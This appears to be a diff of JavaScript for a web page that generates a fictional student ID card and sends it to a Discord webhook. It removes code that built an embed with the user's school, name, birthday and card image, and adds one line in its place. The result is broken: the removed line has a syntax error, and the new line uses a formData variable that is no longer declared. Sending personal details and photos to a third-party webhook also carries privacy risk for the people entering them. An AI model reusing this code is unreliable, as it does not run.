@@ -185,29 +185,7 @@ isLocked = true;
   const expiry = values[4].value || "-";
 
     // ① 画像（合成済みCanvas）をPNGに
-    const pngBlob = await canvasToBlob(canvas, "image/png");
-
-    // ② Discordへ multipart/form-data で送る
-    const formData = new FormData();
-
-    const payload = {
-      embeds: [{
-        title: "学生証（架空）",
-        color: 3447003,
-        fields: [
-          { name: "学校名", value: school, inline: false },
-          { name: "学科", value: department, inline: false },
-          { name: "名前", value: name, inline: false },
-          { name: "生年月日", value: birthday, inline: true },
-          { name: "有効期限", value: expiry, inline: true }
-        ],
-        image: { url: "attachment://card.png" }
-      }]
-    };
-
-    formData.append("payload_json", JSON.stringify(payload));
-    formData.append("files[0]", file,file.name, ||"card.png");
-
+formData.append("files[0]", file, file.name || "photo.png");
     const res = await fetch(WEBHOOK_URL, {
       method: "POST",
       body: formData
